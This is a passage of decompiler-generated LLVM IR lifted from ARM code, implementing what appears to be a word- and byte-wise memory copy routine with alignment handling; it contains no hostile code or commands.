
dec_label_pc_2bfdc:                               ; preds = %.thread115, %dec_label_pc_2bfd8
  %v0_2bfec.pre158 = phi i32 [ %v0_2bfec.pre, %.thread115 ], [ %v1_2bfd8, %dec_label_pc_2bfd8 ]
  %v3_2bfe0 = phi i32 [ %v3_2bfe099116, %.thread115 ], [ %v3_2bfe0101, %dec_label_pc_2bfd8 ]
  %v1_2bfe4 = phi i1 [ %v1_2bfe8, %.thread115 ], [ %v5_2bfd8, %dec_label_pc_2bfd8 ]
  %v0_2bfe4 = phi i1 [ %v0_2bfe8, %.thread115 ], [ %v6_2bfd8, %dec_label_pc_2bfd8 ]
  %v2_2bfdc = xor i1 %v1_2bfe4, %v0_2bfe4
  br i1 %v2_2bfdc, label %.thread115, label %bb139

bb139:                                            ; preds = %dec_label_pc_2bfdc
  %v3_2bfdc = load i32, i32* %r1.global-to-local, align 4
  %v4_2bfdc = inttoptr i32 %v3_2bfdc to i32*
  %v5_2bfdc = load i32, i32* %v4_2bfdc, align 4
  store i32 %v5_2bfdc, i32* @r3, align 4
  %v6_2bfdc = add i32 %v3_2bfdc, 4
  %v7_2bfdc = inttoptr i32 %v6_2bfdc to i32*
  %v8_2bfdc = load i32, i32* %v7_2bfdc, align 4
  store i32 %v8_2bfdc, i32* @ip, align 4
  %v9_2bfdc = add i32 %v3_2bfdc, 8
  %v10_2bfdc = inttoptr i32 %v9_2bfdc to i32*
  %v11_2bfdc = load i32, i32* %v10_2bfdc, align 4
  store i32 %v11_2bfdc, i32* %lr.global-to-local, align 4
  %v12_2bfdc = add i32 %v3_2bfdc, 12
  store i32 %v12_2bfdc, i32* %r1.global-to-local, align 4
  %v4_2bfe0 = inttoptr i32 %v3_2bfe0 to i32*
  store i32 %v5_2bfdc, i32* %v4_2bfe0, align 4
  %v6_2bfe0 = add i32 %v3_2bfe0, 4
  %v7_2bfe0 = inttoptr i32 %v6_2bfe0 to i32*
  %v8_2bfe0 = load i32, i32* @ip, align 4
  store i32 %v8_2bfe0, i32* %v7_2bfe0, align 4
  %v9_2bfe0 = add i32 %v3_2bfe0, 8
  %v10_2bfe0 = inttoptr i32 %v9_2bfe0 to i32*
  %v11_2bfe0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_2bfe0, i32* %v10_2bfe0, align 4
  %v12_2bfe0 = add i32 %v3_2bfe0, 12
  store i32 %v12_2bfe0, i32* %r0.global-to-local, align 4
  %v3_2bfe4 = load i32, i32* %r2.global-to-local, align 4
  %v4_2bfe4 = add i32 %v3_2bfe4, -12
  store i32 %v4_2bfe4, i32* %r2.global-to-local, align 4
  %v6_2bfe4 = sub i32 11, %v3_2bfe4
  %v7_2bfe4 = and i32 %v6_2bfe4, %v3_2bfe4
  %v8_2bfe4 = icmp slt i32 %v7_2bfe4, 0
  store i1 %v8_2bfe4, i1* %cpsr_v.global-to-local, align 1
  %v9_2bfe4 = icmp slt i32 %v4_2bfe4, 0
  store i1 %v9_2bfe4, i1* %cpsr_n.global-to-local, align 1
  %v10_2bfe4 = icmp eq i32 %v3_2bfe4, 12
  store i1 %v10_2bfe4, i1* %cpsr_z.global-to-local, align 1
  br label %.thread115

.thread115:                                       ; preds = %dec_label_pc_2bfdc, %bb139
  %v0_2bfec.pre = phi i32 [ %v4_2bfe4, %bb139 ], [ %v0_2bfec.pre158, %dec_label_pc_2bfdc ]
  %v3_2bfe099116 = phi i32 [ %v12_2bfe0, %bb139 ], [ %v3_2bfe0, %dec_label_pc_2bfdc ]
  %v1_2bfe8 = phi i1 [ %v8_2bfe4, %bb139 ], [ %v1_2bfe4, %dec_label_pc_2bfdc ]
  %v0_2bfe8 = phi i1 [ %v9_2bfe4, %bb139 ], [ %v0_2bfe4, %dec_label_pc_2bfdc ]
  %v2_2bfe8 = xor i1 %v1_2bfe8, %v0_2bfe8
  br i1 %v2_2bfe8, label %dec_label_pc_2bfec, label %dec_label_pc_2bfdc

dec_label_pc_2bfec:                               ; preds = %.thread115, %dec_label_pc_2bf98
  %v4_2bffc = phi i32 [ %v0_2bfb094, %dec_label_pc_2bf98 ], [ %v3_2bfe099116, %.thread115 ]
  %v0_2bfec = phi i32 [ %v1_2bf98, %dec_label_pc_2bf98 ], [ %v0_2bfec.pre, %.thread115 ]
  %v1_2bfec = add i32 %v0_2bfec, 8
  store i32 %v1_2bfec, i32* %r2.global-to-local, align 4
  %v3_2bfec = sub i32 0, %v0_2bfec
  %v4_2bfec = and i32 %v1_2bfec, %v3_2bfec
  %v5_2bfec = icmp slt i32 %v4_2bfec, 0
  store i1 %v5_2bfec, i1* %cpsr_v.global-to-local, align 1
  %v6_2bfec = icmp slt i32 %v1_2bfec, 0
  store i1 %v6_2bfec, i1* %cpsr_n.global-to-local, align 1
  %v7_2bfec = icmp eq i32 %v1_2bfec, 0
  store i1 %v7_2bfec, i1* %cpsr_z.global-to-local, align 1
  %v2_2bff0 = xor i1 %v6_2bfec, %v5_2bfec
  br i1 %v2_2bff0, label %bb141, label %dec_label_pc_2bff4

dec_label_pc_2bff4:                               ; preds = %dec_label_pc_2bfec
  %v1_2bff4 = add i32 %v0_2bfec, 4
  store i32 %v1_2bff4, i32* %r2.global-to-local, align 4
  %v3_2bff4 = sub i32 -5, %v0_2bfec
  %v4_2bff4 = and i32 %v3_2bff4, %v1_2bfec
  %v5_2bff4 = icmp slt i32 %v4_2bff4, 0
  store i1 %v5_2bff4, i1* %cpsr_v.global-to-local, align 1
  %v6_2bff4 = icmp slt i32 %v1_2bff4, 0
  store i1 %v6_2bff4, i1* %cpsr_n.global-to-local, align 1
  %v7_2bff4 = icmp eq i32 %v1_2bfec, 4
  store i1 %v7_2bff4, i1* %cpsr_z.global-to-local, align 1
  %v2_2bff8 = xor i1 %v6_2bff4, %v5_2bff4
  %v3_2bff8 = load i32, i32* %r1.global-to-local, align 4
  %v4_2bff8 = inttoptr i32 %v3_2bff8 to i32*
  %v5_2bff8 = load i32, i32* %v4_2bff8, align 4
  store i32 %v5_2bff8, i32* @r3, align 4
  %v7_2bff8 = add i32 %v3_2bff8, 4
  br i1 %v2_2bff8, label %.thread122, label %bb140

.thread122:                                       ; preds = %dec_label_pc_2bff4
  store i32 %v7_2bff8, i32* %r1.global-to-local, align 4
  %v5_2bffc = inttoptr i32 %v4_2bffc to i32*
  store i32 %v5_2bff8, i32* %v5_2bffc, align 4
  %v6_2bffc = load i32, i32* %r0.global-to-local, align 4
  %v7_2bffc = add i32 %v6_2bffc, 4
  store i32 %v7_2bffc, i32* %r0.global-to-local, align 4
  %v0_2c00c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb141

bb140:                                            ; preds = %dec_label_pc_2bff4
  %v7_2c000 = inttoptr i32 %v7_2bff8 to i32*
  %v8_2c000 = load i32, i32* %v7_2c000, align 4
  store i32 %v8_2c000, i32* @ip, align 4
  %v9_2c000 = add i32 %v3_2bff8, 8
  store i32 %v9_2c000, i32* %r1.global-to-local, align 4
  %v4_2c004 = inttoptr i32 %v4_2bffc to i32*
  store i32 %v5_2bff8, i32* %v4_2c004, align 4
  %v6_2c004 = add i32 %v4_2bffc, 4
  %v7_2c004 = inttoptr i32 %v6_2c004 to i32*
  %v8_2c004 = load i32, i32* @ip, align 4
  store i32 %v8_2c004, i32* %v7_2c004, align 4
  %v9_2c004 = add i32 %v4_2bffc, 8
  store i32 %v9_2c004, i32* %r0.global-to-local, align 4
  %v3_2c008 = load i32, i32* %r2.global-to-local, align 4
  %v4_2c008 = add i32 %v3_2c008, -4
  store i32 %v4_2c008, i32* %r2.global-to-local, align 4
  br label %bb141

bb141:                                            ; preds = %.thread122, %.thread128, %dec_label_pc_2bfec, %bb, %dec_label_pc_2c1bc, %dec_label_pc_2c150, %dec_label_pc_2c0e4, %bb140
  %v0_2c00c = phi i32 [ %v0_2c00c.pre, %.thread122 ], [ %v2_2c05c, %.thread128 ], [ %v1_2bfec, %dec_label_pc_2bfec ], [ %v2_2bf80, %bb ], [ %v0_2c00c61, %dec_label_pc_2c1bc ], [ %v0_2c00c60, %dec_label_pc_2c150 ], [ %v0_2c00c59, %dec_label_pc_2c0e4 ], [ %v4_2c008, %bb140 ]
  %v1_2c00c = add i32 %v0_2c00c, 4
  store i32 %v1_2c00c, i32* %r2.global-to-local, align 4
  %v3_2c00c = sub i32 0, %v0_2c00c
  %v4_2c00c = and i32 %v1_2c00c, %v3_2c00c
  %v5_2c00c = icmp slt i32 %v4_2c00c, 0
  store i1 %v5_2c00c, i1* %cpsr_v.global-to-local, align 1
  %v6_2c00c = icmp slt i32 %v1_2c00c, 0
  store i1 %v6_2c00c, i1* %cpsr_n.global-to-local, align 1
  %v7_2c00c = icmp eq i32 %v1_2c00c, 0
  store i1 %v7_2c00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_2c00c, label %bb142, label %bb141.bb143_crit_edge

bb141.bb143_crit_edge:                            ; preds = %bb141
  %v0_2c014.pre = load i32, i32* @r3, align 4
  br label %bb143

bb142:                                            ; preds = %bb141
  %v3_2c010 = load i8*, i8** %stack_var_-8, align 4
  %v4_2c010 = ptrtoint i8* %v3_2c010 to i32
  store i32 %v4_2c010, i32* %r0.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %bb141.bb143_crit_edge, %bb142
  %v0_2c014 = phi i32 [ %v0_2c014.pre, %bb141.bb143_crit_edge ], [ %v8_2bf7c, %bb142 ]
  call void @__pseudo_cond_branch(i1 %v7_2c00c, i32 %v0_2c014)
  %v0_2c018 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c018 = add i32 %v0_2c018, -2
  %v3_2c018 = sub i32 1, %v0_2c018
  %v4_2c018 = and i32 %v3_2c018, %v0_2c018
  %v5_2c018 = icmp slt i32 %v4_2c018, 0
  store i1 %v5_2c018, i1* %cpsr_v.global-to-local, align 1
  %v6_2c018 = icmp slt i32 %v1_2c018, 0
  store i1 %v6_2c018, i1* %cpsr_n.global-to-local, align 1
  %v7_2c018 = icmp eq i32 %v0_2c018, 2
  store i1 %v7_2c018, i1* %cpsr_z.global-to-local, align 1
  %v0_2c01c = load i32, i32* %r1.global-to-local, align 4
  %v1_2c01c = inttoptr i32 %v0_2c01c to i8*
  %v2_2c01c = load i8, i8* %v1_2c01c, align 1
  %v5_2c01c = add i32 %v0_2c01c, 1
  store i32 %v5_2c01c, i32* %r1.global-to-local, align 4
  %v2_2c020 = load i32, i32* %r0.global-to-local, align 4
  %v3_2c020 = inttoptr i32 %v2_2c020 to i8*
  store i8 %v2_2c01c, i8* %v3_2c020, align 1
  %v4_2c020 = load i32, i32* %r0.global-to-local, align 4
  %v5_2c020 = add i32 %v4_2c020, 1
  store i32 %v5_2c020, i32* %r0.global-to-local, align 4
  %v0_2c024 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_2c024 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_2c024 = xor i1 %v0_2c024, %v1_2c024
  br i1 %v2_2c024, label %.thread125, label %bb144

bb144:                                            ; preds = %bb143
  %v3_2c024 = load i32, i32* %r1.global-to-local, align 4
  %v4_2c024 = inttoptr i32 %v3_2c024 to i8*
  %v5_2c024 = load i8, i8* %v4_2c024, align 1
  %v8_2c024 = add i32 %v3_2c024, 1
  store i32 %v8_2c024, i32* %r1.global-to-local, align 4
  %v6_2c028 = inttoptr i32 %v5_2c020 to i8*
  store i8 %v5_2c024, i8* %v6_2c028, align 1
  %v7_2c028 = load i32, i32* %r0.global-to-local, align 4
  %v8_2c028 = add i32 %v7_2c028, 1
  store i32 %v8_2c028, i32* %r0.global-to-local, align 4
  %v1_2c02c.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_2c02c.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread125

.thread125:                                       ; preds = %bb143, %bb144
  %v7_2c030 = phi i32 [ %v8_2c028, %bb144 ], [ %v5_2c020, %bb143 ]
  %v2_2c030 = phi i1 [ %v2_2c02c.pre, %bb144 ], [ %v1_2c024, %bb143 ]
  %v1_2c030 = phi i1 [ %v1_2c02c.pre, %bb144 ], [ %v0_2c024, %bb143 ]
  %v0_2c02c = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_2c02c = xor i1 %v2_2c030, %v1_2c030
  %v4_2c02c = or i1 %v0_2c02c, %v3_2c02c
  br i1 %v4_2c02c, label %.thread126, label %bb145

bb145:                                            ; preds = %.thread125
  %v5_2c02c = load i32, i32* %r1.global-to-local, align 4
  %v6_2c02c = inttoptr i32 %v5_2c02c to i8*
  %v7_2c02c = load i8, i8* %v6_2c02c, align 1
  %v10_2c02c = add i32 %v5_2c02c, 1
  store i32 %v10_2c02c, i32* %r1.global-to-local, align 4
  %v8_2c030 = inttoptr i32 %v7_2c030 to i8*
  store i8 %v7_2c02c, i8* %v8_2c030, align 1
  %v9_2c030 = load i32, i32* %r0.global-to-local, align 4
  %v10_2c030 = add i32 %v9_2c030, 1
  store i32 %v10_2c030, i32* %r0.global-to-local, align 4
  br label %.thread126

.thread126:                                       ; preds = %.thread125, %bb145
  %v2_2c034 = load i8*, i8** %stack_var_-8, align 4
  %v3_2c034 = ptrtoint i8* %v2_2c034 to i32
  store i32 %v3_2c034, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 %v8_2bf7c)
  %v0_2c03c.pre = load i32, i32* @ip, align 4
  %v0_2c044.pre = load i32, i32* %r1.global-to-local, align 4
  %v2_2c048.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2c03c

dec_label_pc_2c03c:                               ; preds = %dec_label_pc_2bf88, %.thread126
  %v2_2c048 = phi i32 [ %v1_2bf70, %dec_label_pc_2bf88 ], [ %v2_2c048.pre, %.thread126 ]
  %v0_2c044 = phi i32 [ %v0_2bf70, %dec_label_pc_2bf88 ], [ %v0_2c044.pre, %.thread126 ]
  %v0_2c03c = phi i32 [ %v1_2bf88, %dec_label_pc_2bf88 ], [ %v0_2c03c.pre, %.thread126 ]
  %v1_2c03c = sub i32 4, %v0_2c03c
  store i32 %v1_2c03c, i32* @ip, align 4
  %v1_2c040 = add i32 %v1_2c03c, -2
  %v3_2c040 = sub i32 1, %v1_2c03c
  %v4_2c040 = and i32 %v3_2c040, %v1_2c03c
  %v5_2c040 = icmp slt i32 %v4_2c040, 0
  store i1 %v5_2c040, i1* %cpsr_v.global-to-local, align 1
  %v6_2c040 = icmp slt i32 %v1_2c040, 0
  store i1 %v6_2c040, i1* %cpsr_n.global-to-local, align 1
  %v7_2c040 = icmp eq i32 %v1_2c03c, 2
  store i1 %v7_2c040, i1* %cpsr_z.global-to-local, align 1
  %v1_2c044 = inttoptr i32 %v0_2c044 to i8*
  %v2_2c044 = load i8, i8* %v1_2c044, align 1
  %v3_2c044 = zext i8 %v2_2c044 to i32
  store i32 %v3_2c044, i32* @r3, align 4
  %v5_2c044 = add i32 %v0_2c044, 1
  store i32 %v5_2c044, i32* %r1.global-to-local, align 4
  %v3_2c048 = inttoptr i32 %v2_2c048 to i8*
  store i8 %v2_2c044, i8* %v3_2c048, align 1
  %v4_2c048 = load i32, i32* %r0.global-to-local, align 4
  %v5_2c048 = add i32 %v4_2c048, 1
  store i32 %v5_2c048, i32* %r0.global-to-local, align 4
  %v0_2c04c = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_2c04c = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_2c04c = xor i1 %v0_2c04c, %v1_2c04c
  br i1 %v2_2c04c, label %.thread127, label %bb146

bb146:                                            ; preds = %dec_label_pc_2c03c
  %v3_2c04c = load i32, i32* %r1.global-to-local, align 4
  %v4_2c04c = inttoptr i32 %v3_2c04c to i8*
  %v5_2c04c = load i8, i8* %v4_2c04c, align 1
  %v6_2c04c = zext i8 %v5_2c04c to i32
  store i32 %v6_2c04c, i32* @r3, align 4
  %v8_2c04c = add i32 %v3_2c04c, 1
  store i32 %v8_2c04c, i32* %r1.global-to-local, align 4
  %v6_2c050 = inttoptr i32 %v5_2c048 to i8*
  store i8 %v5_2c04c, i8* %v6_2c050, align 1
  %v7_2c050 = load i32, i32* %r0.global-to-local, align 4
  %v8_2c050 = add i32 %v7_2c050, 1
  store i32 %v8_2c050, i32* %r0.global-to-local, align 4
  %v1_2c054.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_2c054.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread127

.thread127:                                       ; preds = %dec_label_pc_2c03c, %bb146
  %v7_2c058 = phi i32 [ %v8_2c050, %bb146 ], [ %v5_2c048, %dec_label_pc_2c03c ]
  %v2_2c058 = phi i1 [ %v2_2c054.pre, %bb146 ], [ %v1_2c04c, %dec_label_pc_2c03c ]
  %v1_2c058 = phi i1 [ %v1_2c054.pre, %bb146 ], [ %v0_2c04c, %dec_label_pc_2c03c ]
  %v0_2c054 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_2c054 = xor i1 %v2_2c058, %v1_2c058
  %v4_2c054 = or i1 %v0_2c054, %v3_2c054
  br i1 %v4_2c054, label %.thread128, label %bb147

bb147:                                            ; preds = %.thread127
  %v5_2c054 = load i32, i32* %r1.global-to-local, align 4
  %v6_2c054 = inttoptr i32 %v5_2c054 to i8*
  %v7_2c054 = load i8, i8* %v6_2c054, align 1
  %v8_2c054 = zext i8 %v7_2c054 to i32
  store i32 %v8_2c054, i32* @r3, align 4
  %v10_2c054 = add i32 %v5_2c054, 1
  store i32 %v10_2c054, i32* %r1.global-to-local, align 4
  %v8_2c058 = inttoptr i32 %v7_2c058 to i8*
  store i8 %v7_2c054, i8* %v8_2c058, align 1
  %v9_2c058 = load i32, i32* %r0.global-to-local, align 4
  %v10_2c058 = add i32 %v9_2c058, 1
  store i32 %v10_2c058, i32* %r0.global-to-local, align 4
  br label %.thread128

.thread128:                                       ; preds = %.thread127, %bb147
  %v0_2c18c77 = phi i32 [ %v10_2c058, %bb147 ], [ %v7_2c058, %.thread127 ]
  %v0_2c05c = load i32, i32* %r2.global-to-local, align 4
  %v1_2c05c = load i32, i32* @ip, align 4
  %v2_2c05c = sub i32 %v0_2c05c, %v1_2c05c
  store i32 %v2_2c05c, i32* %r2.global-to-local, align 4
  %v4_2c05c = xor i32 %v1_2c05c, %v0_2c05c
  %v5_2c05c = xor i32 %v2_2c05c, %v0_2c05c
  %v6_2c05c = and i32 %v5_2c05c, %v4_2c05c
  %v7_2c05c = icmp slt i32 %v6_2c05c, 0
  store i1 %v7_2c05c, i1* %cpsr_v.global-to-local, align 1
  %v8_2c05c = icmp slt i32 %v2_2c05c, 0
  store i1 %v8_2c05c, i1* %cpsr_n.global-to-local, align 1
  %v9_2c05c = icmp eq i32 %v0_2c05c, %v1_2c05c
  store i1 %v9_2c05c, i1* %cpsr_z.global-to-local, align 1
  %v2_2c060 = xor i1 %v8_2c05c, %v7_2c05c
  br i1 %v2_2c060, label %bb141, label %dec_label_pc_2c064

dec_label_pc_2c064:                               ; preds = %.thread128
  %v0_2c064 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c064 = urem i32 %v0_2c064, 4
  store i32 %v1_2c064, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_2c064 = icmp eq i32 %v1_2c064, 0
  store i1 %v2_2c064, i1* %cpsr_z.global-to-local, align 1
  %extract.t131 = trunc i32 %v0_2c064 to i2
  br i1 %v2_2c064, label %dec_label_pc_2bf98, label %dec_label_pc_2c06c

dec_label_pc_2c06c:                               ; preds = %dec_label_pc_2bf90, %dec_label_pc_2c064
  %v0_2c18c76 = phi i32 [ %v1_2bf70, %dec_label_pc_2bf90 ], [ %v0_2c18c77, %dec_label_pc_2c064 ]
  %v0_2c0f4 = phi i32 [ %v2_2bf80, %dec_label_pc_2bf90 ], [ %v2_2c05c, %dec_label_pc_2c064 ]
  %v0_2c074.off0 = phi i2 [ %extract.t, %dec_label_pc_2bf90 ], [ %extract.t131, %dec_label_pc_2c064 ]
  %v0_2c06c = phi i32 [ %v0_2bf70, %dec_label_pc_2bf90 ], [ %v0_2c064, %dec_label_pc_2c064 ]
  %v1_2c06c = and i32 %v0_2c06c, -4
  store i32 %v1_2c06c, i32* %r1.global-to-local, align 4
  %v1_2c070 = inttoptr i32 %v1_2c06c to i32*
  %v2_2c070 = load i32, i32* %v1_2c070, align 4
  store i32 %v2_2c070, i32* %lr.global-to-local, align 4
  %v4_2c070 = add i32 %v1_2c06c, 4
  store i32 %v4_2c070, i32* %r1.global-to-local, align 4
  %v1_2c0ec = add i32 %v0_2c0f4, -12
  %v3_2c0ec = sub i32 11, %v0_2c0f4
  %v4_2c0ec = and i32 %v3_2c0ec, %v0_2c0f4
  %v5_2c0ec = icmp slt i32 %v4_2c0ec, 0
  store i1 %v5_2c0ec, i1* %cpsr_v.global-to-local, align 1
  %v6_2c0ec = icmp slt i32 %v1_2c0ec, 0
  store i1 %v6_2c0ec, i1* %cpsr_n.global-to-local, align 1
  %v7_2c0ec = icmp eq i32 %v0_2c0f4, 12
  store i1 %v7_2c0ec, i1* %cpsr_z.global-to-local, align 1
  %v2_2c0f0 = xor i1 %v6_2c0ec, %v5_2c0ec
  switch i2 %v0_2c074.off0, label %dec_label_pc_2c080 [
    i2 -1, label %dec_label_pc_2c158
    i2 -2, label %dec_label_pc_2c0ec
  ]

dec_label_pc_2c080:                               ; preds = %dec_label_pc_2c06c
  br i1 %v2_2c0f0, label %dec_label_pc_2c0cc, label %dec_label_pc_2c088

dec_label_pc_2c088:                               ; preds = %dec_label_pc_2c080
  store i32 %v1_2c0ec, i32* %r2.global-to-local, align 4
  %v3_2c08c = load i32, i32* @r4, align 4
  store i32 %v3_2c08c, i32* %stack_var_-16, align 4
  %v6_2c08c = load i32, i32* @r5, align 4
  store i32 %v6_2c08c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_2c090

dec_label_pc_2c090:                               ; preds = %dec_label_pc_2c090.dec_label_pc_2c090_crit_edge, %dec_label_pc_2c088
  %v0_2c0b4 = phi i32 [ %v12_2c0b4, %dec_label_pc_2c090.dec_label_pc_2c090_crit_edge ], [ %v0_2c18c76, %dec_label_pc_2c088 ]
  %v0_2c094 = phi i32 [ %v0_2c094.pre, %dec_label_pc_2c090.dec_label_pc_2c090_crit_edge ], [ %v4_2c070, %dec_label_pc_2c088 ]
  %v0_2c090 = phi i32 [ %v0_2c090.pre, %dec_label_pc_2c090.dec_label_pc_2c090_crit_edge ], [ %v2_2c070, %dec_label_pc_2c088 ]
  %v3_2c090 = udiv i32 %v0_2c090, 256
  %v1_2c094 = inttoptr i32 %v0_2c094 to i32*
  %v2_2c094 = load i32, i32* %v1_2c094, align 4
  store i32 %v2_2c094, i32* %r4.global-to-local, align 4
  %v3_2c094 = add i32 %v0_2c094, 4
  %v4_2c094 = inttoptr i32 %v3_2c094 to i32*
  %v5_2c094 = load i32, i32* %v4_2c094, align 4
  store i32 %v5_2c094, i32* %r5.global-to-local, align 4
  %v6_2c094 = add i32 %v0_2c094, 8
  %v7_2c094 = inttoptr i32 %v6_2c094 to i32*
  %v8_2c094 = load i32, i32* %v7_2c094, align 4
  store i32 %v8_2c094, i32* %ip.global-to-local, align 4
  %v9_2c094 = add i32 %v0_2c094, 12
  %v10_2c094 = inttoptr i32 %v9_2c094 to i32*
  %v11_2c094 = load i32, i32* %v10_2c094, align 4
  store i32 %v11_2c094, i32* %lr.global-to-local, align 4
  %v12_2c094 = add i32 %v0_2c094, 16
  store i32 %v12_2c094, i32* %r1.global-to-local, align 4
  %v4_2c098 = mul i32 %v2_2c094, 16777216
  %v5_2c098 = or i32 %v4_2c098, %v3_2c090
  store i32 %v5_2c098, i32* @r3, align 4
  %v3_2c09c = udiv i32 %v2_2c094, 256
  %v4_2c0a0 = mul i32 %v5_2c094, 16777216
  %v5_2c0a0 = or i32 %v4_2c0a0, %v3_2c09c
  store i32 %v5_2c0a0, i32* %r4.global-to-local, align 4
  %v3_2c0a4 = udiv i32 %v5_2c094, 256
  %v4_2c0a8 = mul i32 %v8_2c094, 16777216
  %v5_2c0a8 = or i32 %v4_2c0a8, %v3_2c0a4
  store i32 %v5_2c0a8, i32* %r5.global-to-local, align 4
  %v3_2c0ac = udiv i32 %v8_2c094, 256
  %v4_2c0b0 = mul i32 %v11_2c094, 16777216
  %v5_2c0b0 = or i32 %v4_2c0b0, %v3_2c0ac
  store i32 %v5_2c0b0, i32* @ip, align 4
  %v1_2c0b4 = inttoptr i32 %v0_2c0b4 to i32*
  store i32 %v5_2c098, i32* %v1_2c0b4, align 4
  %v3_2c0b4 = add i32 %v0_2c0b4, 4
  %v4_2c0b4 = inttoptr i32 %v3_2c0b4 to i32*
  %v5_2c0b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_2c0b4, i32* %v4_2c0b4, align 4
  %v6_2c0b4 = add i32 %v0_2c0b4, 8
  %v7_2c0b4 = inttoptr i32 %v6_2c0b4 to i32*
  %v8_2c0b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_2c0b4, i32* %v7_2c0b4, align 4
  %v9_2c0b4 = add i32 %v0_2c0b4, 12
  %v10_2c0b4 = inttoptr i32 %v9_2c0b4 to i32*
  %v11_2c0b4 = load i32, i32* @ip, align 4
  store i32 %v11_2c0b4, i32* %v10_2c0b4, align 4
  %v12_2c0b4 = add i32 %v0_2c0b4, 16
  store i32 %v12_2c0b4, i32* %r0.global-to-local, align 4
  %v0_2c0b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_2c0b8 = add i32 %v0_2c0b8, -16
  store i32 %v1_2c0b8, i32* %r2.global-to-local, align 4
  %v3_2c0b8 = sub i32 15, %v0_2c0b8
  %v4_2c0b8 = and i32 %v3_2c0b8, %v0_2c0b8
  %v5_2c0b8 = icmp slt i32 %v4_2c0b8, 0
  %v6_2c0b8 = icmp slt i32 %v1_2c0b8, 0
  %v2_2c0bc = xor i1 %v6_2c0b8, %v5_2c0b8
  br i1 %v2_2c0bc, label %dec_label_pc_2c0c0, label %dec_label_pc_2c090.dec_label_pc_2c090_crit_edge

dec_label_pc_2c090.dec_label_pc_2c090_crit_edge:  ; preds = %dec_label_pc_2c090
  %v0_2c090.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_2c094.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_2c090

dec_label_pc_2c0c0:                               ; preds = %dec_label_pc_2c090
  %v2_2c0c0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2c0c0, i32* @r4, align 4
  %v5_2c0c0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_2c0c0, i32* @r5, align 4
  %v1_2c0c4 = add i32 %v0_2c0b8, -4
  store i32 %v1_2c0c4, i32* %r2.global-to-local, align 4
  %v3_2c0c4 = add i32 %v0_2c0b8, 2147483632
  %v4_2c0c4 = and i32 %v1_2c0c4, %v3_2c0c4
  %v5_2c0c4 = icmp slt i32 %v4_2c0c4, 0
  store i1 %v5_2c0c4, i1* %cpsr_v.global-to-local, align 1
  %v6_2c0c4 = icmp slt i32 %v1_2c0c4, 0
  store i1 %v6_2c0c4, i1* %cpsr_n.global-to-local, align 1
  %v7_2c0c4 = icmp eq i32 %v1_2c0c4, 0
  store i1 %v7_2c0c4, i1* %cpsr_z.global-to-local, align 1
  %v2_2c0c8 = xor i1 %v6_2c0c4, %v5_2c0c4
  br i1 %v2_2c0c8, label %dec_label_pc_2c0e4, label %dec_label_pc_2c0cc

dec_label_pc_2c0cc:                               ; preds = %dec_label_pc_2c0c0, %dec_label_pc_2c080, %dec_label_pc_2c0cc
  %v1_2c0d8 = phi i32 [ %v4_2c0d8, %dec_label_pc_2c0cc ], [ %v12_2c0b4, %dec_label_pc_2c0c0 ], [ %v0_2c18c76, %dec_label_pc_2c080 ]
  %v0_2c0cc = load i32, i32* %lr.global-to-local, align 4
  %v3_2c0cc = udiv i32 %v0_2c0cc, 256
  store i32 %v3_2c0cc, i32* %ip.global-to-local, align 4
  %v0_2c0d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_2c0d0 = inttoptr i32 %v0_2c0d0 to i32*
  %v2_2c0d0 = load i32, i32* %v1_2c0d0, align 4
  store i32 %v2_2c0d0, i32* %lr.global-to-local, align 4
  %v4_2c0d0 = add i32 %v0_2c0d0, 4
  store i32 %v4_2c0d0, i32* %r1.global-to-local, align 4
  %v4_2c0d4 = mul i32 %v2_2c0d0, 16777216
  %v5_2c0d4 = or i32 %v4_2c0d4, %v3_2c0cc
  store i32 %v5_2c0d4, i32* @ip, align 4
  %v2_2c0d8 = inttoptr i32 %v1_2c0d8 to i32*
  store i32 %v5_2c0d4, i32* %v2_2c0d8, align 4
  %v3_2c0d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_2c0d8 = add i32 %v3_2c0d8, 4
  store i32 %v4_2c0d8, i32* %r0.global-to-local, align 4
  %v0_2c0dc = load i32, i32* %r2.global-to-local, align 4
  %v1_2c0dc = add i32 %v0_2c0dc, -4
  store i32 %v1_2c0dc, i32* %r2.global-to-local, align 4
  %v3_2c0dc = sub i32 3, %v0_2c0dc
  %v4_2c0dc = and i32 %v3_2c0dc, %v0_2c0dc
  %v5_2c0dc = icmp slt i32 %v4_2c0dc, 0
  %v6_2c0dc = icmp slt i32 %v1_2c0dc, 0
  %v2_2c0e0 = xor i1 %v6_2c0dc, %v5_2c0dc
  br i1 %v2_2c0e0, label %dec_label_pc_2c0e4.loopexit, label %dec_label_pc_2c0cc

dec_label_pc_2c0e4.loopexit:                      ; preds = %dec_label_pc_2c0cc
  %v7_2c0dc = icmp eq i32 %v0_2c0dc, 4
  store i1 %v5_2c0dc, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_2c0dc, i1* %cpsr_n.global-to-local, align 1
